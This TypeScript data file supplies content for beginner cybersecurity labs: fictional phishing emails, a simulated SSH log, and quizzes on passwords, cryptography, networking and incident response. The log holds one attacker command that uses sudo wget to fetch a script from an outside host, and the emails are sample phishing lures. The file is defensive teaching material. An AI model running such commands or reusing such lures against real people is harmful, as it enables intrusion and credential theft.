// Cyber Labs content. Every name, address, and message here is fictional,
// using reserved example domains (example.com/.net) and documentation IP
// ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) where possible.

import type { QuizQuestion } from '../lib/learning/progress.ts';

export interface Lab {
  id: string;
  title: string;
  summary: string;
  minutes: number;
  status: 'ready' | 'planned';
}

export const LABS: readonly Lab[] = [
  { id: 'phishing-simulation', title: 'Phishing Simulation Lab', summary: 'Sort fictional emails into phishing or legitimate, then see the clues you caught or missed.', minutes: 8, status: 'ready' },
  { id: 'log-analysis', title: 'Log Analysis Lab', summary: 'Investigate a fictional login log to find a brute-force attack and the account it broke into.', minutes: 10, status: 'ready' },
  { id: 'terminal', title: 'Terminal Simulator', summary: 'Practice Linux commands in a safe, pretend shell and investigate a suspicious machine.', minutes: 10, status: 'ready' },
  { id: 'password-lab', title: 'Password Security Lab', summary: 'Experiment with how length and character choices change guessing difficulty.', minutes: 8, status: 'ready' },
  { id: 'crypto-lab', title: 'Cryptography Lab', summary: 'Hash, encode, and encrypt step by step to see how each one behaves.', minutes: 10, status: 'ready' },
  { id: 'network-lab', title: 'Network Fundamentals Lab', summary: 'Read simulated DNS records, IP addresses, and ports, with knowledge checks.', minutes: 10, status: 'ready' },
  { id: 'incident-response', title: 'Incident Response Lab', summary: 'Work through a fictional incident and choose the right defensive steps.', minutes: 12, status: 'ready' },
];

export const READY_LAB_IDS = new Set(LABS.filter((l) => l.status === 'ready').map((l) => l.id));
export const findLab = (id: string) => LABS.find((l) => l.id === id);

// ---------------- Phishing Simulation ----------------

export interface SimEmail {
  id: string;
  from: string;
  subject: string;
  body: string;
  /** The link shown in the email, if any (display text → real destination). */
  link?: { text: string; href: string };
  phishing: boolean;
  clues: string[];
}

export const SIM_EMAILS: readonly SimEmail[] = [
  {
    id: 'e1', phishing: true,
    from: 'Steam Support <support@steampowered-security.example>',
    subject: 'URGENT: Your account will be suspended in 24 hours',
    body: 'We detected unusual trade activity on your account. To avoid permanent suspension, verify your login details within 24 hours using the secure link below.',
    link: { text: 'Verify my account', href: 'https://steamcommunity.com.verify-login.example/auth' },
    clues: ['The sender’s domain is steampowered-security.example, not steampowered.com.', 'The link’s real site is verify-login.example; “steamcommunity.com” is just a subdomain disguise.', 'A 24-hour suspension threat is pressure to act before thinking.'],
  },
  {
    id: 'e2', phishing: false,
    from: 'GitHub <noreply@github.com>',
    subject: '[GitHub] A new SSH key was added to your account',
    body: 'A new public key was added to your account. If you added this key, you can ignore this message. If not, review your account’s security settings on github.com.',
    clues: ['The sender domain is the real github.com.', 'It doesn’t ask for a password or code, and it tells you to go to the site yourself.', 'Security notices like this are normal. If you didn’t add a key, you’d check by typing github.com yourself.'],
  },
  {
    id: 'e3', phishing: true,
    from: 'Discord Nitro <gifts@dlscord-nitro.example>',
    subject: 'You’ve been gifted 3 months of Nitro!',
    body: 'A friend sent you a Nitro gift! Claim it before it expires tonight. Log in with your Discord account to activate.',
    link: { text: 'Claim gift', href: 'https://dlscord-nitro.example/claim' },
    clues: ['“dlscord” swaps the i for an l: a look-alike domain.', 'Free gifts that expire tonight are classic bait.', 'Real Discord gifts appear inside Discord, not on a login page from an email.'],
  },
  {
    id: 'e4', phishing: false,
    from: 'Epic Games <help@accts.epicgames.com>',
    subject: 'Your Epic Games security code',
    body: 'Here is the security code you requested: 482 913. If you didn’t request this code, someone may be trying to sign in. Don’t share this code with anyone, including Epic employees.',
    clues: ['It’s from an epicgames.com subdomain, and you just requested a code.', 'It explicitly says never to share the code.', 'Warning sign if you DIDN’T request it: someone has your password. Change it and turn on 2FA.'],
  },
  {
    id: 'e5', phishing: true,
    from: 'School IT Helpdesk <it-helpdesk.mailbox@gmail.example>',
    subject: 'Mailbox storage full: action required',
    body: 'Your school mailbox is 99% full and will stop receiving email. Reply with your username and password so we can increase your storage.',
    clues: ['Real IT departments use the school’s own domain, not a free email account.', 'No legitimate helpdesk asks for your password by email.', 'The fake “storage full” deadline creates urgency.'],
  },
];

// ---------------- Log Analysis ----------------

/** A fictional SSH authentication log for a small server. */
export const LOG_LINES: readonly string[] = [
  'Nov 03 01:58:12 web01 sshd[2201]: Accepted publickey for deploy from 192.0.2.10 port 40112',
  'Nov 03 02:14:07 web01 sshd[2310]: Failed password for root from 203.0.113.45 port 51122',
  'Nov 03 02:14:09 web01 sshd[2310]: Failed password for root from 203.0.113.45 port 51124',
  'Nov 03 02:14:11 web01 sshd[2311]: Failed password for admin from 203.0.113.45 port 51130',
  'Nov 03 02:14:13 web01 sshd[2311]: Failed password for admin from 203.0.113.45 port 51133',
  'Nov 03 02:14:15 web01 sshd[2312]: Failed password for jsmith from 203.0.113.45 port 51140',
  'Nov 03 02:14:17 web01 sshd[2312]: Failed password for jsmith from 203.0.113.45 port 51141',
  'Nov 03 02:14:19 web01 sshd[2313]: Failed password for jsmith from 203.0.113.45 port 51145',
  'Nov 03 02:14:22 web01 sshd[2313]: Accepted password for jsmith from 203.0.113.45 port 51149',
  'Nov 03 02:15:40 web01 sudo: jsmith : USER=root ; COMMAND=/usr/bin/wget http://198.51.100.77/x.sh',
  'Nov 03 02:16:02 web01 sshd[2320]: Failed password for invalid user test from 198.51.100.23 port 40001',
  'Nov 03 09:02:45 web01 sshd[2401]: Accepted password for jsmith from 192.0.2.55 port 52210',
  'Nov 03 09:03:10 web01 sshd[2402]: Accepted publickey for deploy from 192.0.2.10 port 40188',
];

export const LOG_QUESTIONS: readonly QuizQuestion[] = [
  { id: 'l1', question: 'Which IP address made the brute-force attempt (many failed logins in a few seconds)?', options: ['192.0.2.10', '203.0.113.45', '198.51.100.23', '192.0.2.55'], answer: 1, explanation: '203.0.113.45 made 7 failed attempts against root, admin, and jsmith within 12 seconds: a password-guessing attack.' },
  { id: 'l2', question: 'Which account was compromised?', options: ['root', 'admin', 'jsmith', 'deploy'], answer: 2, explanation: 'At 02:14:22 the same attacking IP got “Accepted password for jsmith” right after failures. Success after a burst of failures from one IP is the key sign.' },
  { id: 'l3', question: 'What did the attacker do right after getting in?', options: ['Logged out immediately', 'Used sudo to download a script from 198.51.100.77', 'Changed the root password', 'Nothing was logged'], answer: 1, explanation: 'At 02:15:40 jsmith ran wget through sudo to fetch x.sh from an outside server: likely malware or a backdoor.' },
  { id: 'l4', question: 'The 09:02 login for jsmith comes from 192.0.2.55, a different IP. What’s the best first response?', options: ['Ignore it; it’s probably the real user', 'Disable jsmith, block 203.0.113.45, and investigate x.sh before trusting any jsmith login', 'Delete the log file', 'Restart the server and move on'], answer: 1, explanation: 'Once an account is known to be compromised, every later login is suspect. Contain first (disable, block), then investigate what was downloaded. Never delete evidence.' },
];

// ---------------- Password Security Lab ----------------

/** Fictional sample passwords to compare. Don't type real passwords into any lab. */
export const PASSWORD_SAMPLES: readonly string[] = [
  'dragon2026', 'P@ssw0rd!', 'qwerty123456', 'Tr0ub4dor&3', 'cedar-orbit-mango-river-quill', 'aaaaaaaaaaaa1!', 'kX9#vL2$qW7!mR4z',
];

export const PASSWORD_LAB_QUIZ: readonly QuizQuestion[] = [
  { id: 'p1', question: 'Which change adds the most guessing difficulty to a 10-character lowercase password?', options: ['Swap one letter for a symbol', 'Add 8 more random characters', 'Capitalize the first letter', 'Add “!” to the end'], answer: 1, explanation: 'Each random character multiplies the possibilities. Eight more characters adds far more than one predictable capital or symbol, which attackers try first anyway.' },
  { id: 'p2', question: 'Why is “P@ssw0rd!” weak even though it has every character type?', options: ['It’s too long', 'Cracking tools undo common symbol swaps and test it almost first', 'Symbols aren’t allowed in passwords', 'It isn’t weak'], answer: 1, explanation: 'Brute-force math assumes random characters, but real attacks start with word lists plus common swaps (@ for a, 0 for o). Patterns cancel out the extra character types.' },
  { id: 'p3', question: 'Five random words vs. eight random characters with all types. Which is usually stronger?', options: ['The eight characters', 'The five random words', 'They’re identical', 'Neither can be guessed'], answer: 1, explanation: 'Five words chosen randomly from a large list give far more combinations than 8 characters, and they’re easier to remember. Randomness and length beat complexity.' },
];

// ---------------- Cryptography Lab ----------------

export const CRYPTO_LAB_QUIZ: readonly QuizQuestion[] = [
  { id: 'c1', question: 'You changed one letter of the input. About how much of the SHA-256 hash changed?', options: ['One character', 'About half of all the bits', 'Nothing', 'Only the last few characters'], answer: 1, explanation: 'That’s the avalanche effect: a tiny change flips about half of the 256 bits, so you can’t learn anything about the input from similar-looking hashes.' },
  { id: 'c2', question: 'Why did encrypting the same text twice give different output?', options: ['A bug', 'A random salt and IV are used each time', 'The key changed by itself', 'Base64 is random'], answer: 1, explanation: 'Fresh random salt and IV values mean identical messages encrypt differently, so an eavesdropper can’t tell when the same message is sent twice.' },
  { id: 'c3', question: 'Which of the three outputs could anyone turn back into your text without a secret?', options: ['Base64', 'SHA-256 hash', 'AES encryption', 'None of them'], answer: 0, explanation: 'Base64 is just encoding: anyone can decode it. A hash can’t be reversed at all, and AES needs the passphrase.' },
];

// ---------------- Network Fundamentals Lab ----------------

export const NETWORK_DEVICES: readonly { name: string; ip: string; mac: string; role: string }[] = [
  { name: 'home-router', ip: '192.168.1.1', mac: '3C:22:FB:10:00:01', role: 'Router, DHCP server, gateway' },
  { name: 'gaming-pc', ip: '192.168.1.20', mac: 'A4:83:E7:2B:5C:19', role: 'Desktop' },
  { name: 'phone', ip: '192.168.1.34', mac: 'DA:11:9E:4F:02:7B', role: 'Phone (randomized MAC)' },
  { name: 'smart-camera', ip: '192.168.1.50', mac: '00:1A:79:33:AB:CD', role: 'Camera with a web admin page' },
];

export const NETWORK_DNS: readonly { name: string; type: string; value: string }[] = [
  { name: 'example.net', type: 'A', value: '198.51.100.10' },
  { name: 'www.example.net', type: 'CNAME', value: 'example.net' },
  { name: 'example.net', type: 'MX', value: '10 mail.example.net' },
  { name: 'example.net', type: 'TXT', value: 'v=spf1 mx -all' },
];

export const NETWORK_PORTS: readonly { host: string; port: number; service: string }[] = [
  { host: '192.168.1.1', port: 53, service: 'DNS' },
  { host: '192.168.1.1', port: 443, service: 'HTTPS (router admin)' },
  { host: '192.168.1.50', port: 23, service: 'Telnet' },
  { host: '192.168.1.50', port: 80, service: 'HTTP (camera admin)' },
];

export const NETWORK_LAB_QUIZ: readonly QuizQuestion[] = [
  { id: 'n1', question: 'Which device is the default gateway that every other device sends internet traffic to?', options: ['gaming-pc', 'home-router (192.168.1.1)', 'smart-camera', 'phone'], answer: 1, explanation: 'The router at 192.168.1.1 is the gateway: traffic for anywhere outside the local network goes through it.' },
  { id: 'n2', question: 'What does the MX record for example.net tell you?', options: ['The website’s IP address', 'Which server receives email for the domain', 'The domain owner’s name', 'The SPF password'], answer: 1, explanation: 'MX records name the mail servers. “10 mail.example.net” means email goes to mail.example.net with priority 10.' },
  { id: 'n3', question: 'Which open port on the network is the biggest security concern?', options: ['53 on the router', '443 on the router', '23 (Telnet) on the smart camera', 'None of them'], answer: 2, explanation: 'Telnet sends logins in plain text and is a favorite target of IoT botnets. It should be disabled, and the camera’s firmware updated.' },
  { id: 'n4', question: 'www.example.net is a CNAME for example.net. What IP will a browser end up connecting to?', options: ['192.168.1.1', '198.51.100.10', 'mail.example.net', 'It can’t be determined'], answer: 1, explanation: 'A CNAME is an alias. The lookup continues at example.net, whose A record is 198.51.100.10.' },
];

// ---------------- Incident Response Lab ----------------

export interface IrStep {
  id: string;
  phase: string;
  situation: string;
  options: { text: string; best: boolean; why: string }[];
}

/** A fictional incident at a small gaming community, following the NIST incident-handling phases. */
export const IR_STEPS: readonly IrStep[] = [
  { id: 'detect', phase: 'Detection',
    situation: 'Friday night, a teammate says the team’s Discord server is posting “free Nitro” links nobody wrote. The posts come from the moderator account “mod_jay”.',
    options: [
      { text: 'Treat it as an incident: note the time, screenshot the posts, and alert the other admins.', best: true, why: 'Recording what you see and when, and telling the people who can act, is the first step. Evidence fades fast.' },
      { text: 'Delete the posts and hope it stops.', best: false, why: 'Deleting first destroys evidence and doesn’t stop the attacker, who still controls the account.' },
      { text: 'Wait until Monday to see if it keeps happening.', best: false, why: 'Every hour, more members may click the scam links. Speed limits the damage.' },
    ] },
  { id: 'contain', phase: 'Containment',
    situation: 'The posts keep coming from mod_jay. Jay says they clicked a “Steam gift” link yesterday and logged in.',
    options: [
      { text: 'Remove mod_jay’s moderator role right away, and pin a warning not to click the links.', best: true, why: 'Containment stops the spread: the compromised account loses power, and members are warned. Then you can investigate calmly.' },
      { text: 'Ban every member who clicked a link.', best: false, why: 'The victims aren’t the problem. Focus on cutting off the attacker’s access.' },
      { text: 'Message the attacker and ask them to stop.', best: false, why: 'Engaging the attacker tips them off and achieves nothing.' },
    ] },
  { id: 'eradicate', phase: 'Eradication',
    situation: 'The account is contained. How does Jay get the account back and keep the attacker out?',
    options: [
      { text: 'Change the password from a clean device, sign out all sessions, turn on 2FA, and check for bots or webhooks the attacker added.', best: true, why: 'Eradication removes every foothold: the stolen password, active sessions, and anything the attacker left behind.' },
      { text: 'Just change the password.', best: false, why: 'Existing sessions and any bots or webhooks the attacker added would keep working.' },
      { text: 'Create a new account and abandon the old one.', best: false, why: 'The old account would still be in the attacker’s hands and could scam people who trust it.' },
    ] },
  { id: 'recover', phase: 'Recovery',
    situation: 'Jay’s account is secure. What now?',
    options: [
      { text: 'Restore the moderator role, remove the scam posts, tell members what happened and what to do if they clicked, and watch for a repeat.', best: true, why: 'Recovery returns things to normal while helping anyone affected and watching for signs the attacker is back.' },
      { text: 'Say nothing so the server doesn’t look bad.', best: false, why: 'Members who clicked need to know to secure their own accounts. Transparency builds trust.' },
      { text: 'Shut the server down permanently.', best: false, why: 'That punishes the whole community. The threat has been removed.' },
    ] },
  { id: 'lessons', phase: 'Lessons learned',
    situation: 'A week later, the team reviews the incident. What’s the most valuable change?',
    options: [
      { text: 'Require 2FA for every moderator, and teach the team to spot fake gift links.', best: true, why: 'The root cause was a phished password with no 2FA. Fixing the cause prevents the next incident; Discord can require 2FA for moderators.' },
      { text: 'Blame Jay and remove them from the team.', best: false, why: 'Blame makes people hide mistakes next time. Fix the process, not the person.' },
      { text: 'Nothing; it’s over.', best: false, why: 'Skipping the review means repeating the same incident.' },
    ] },
];
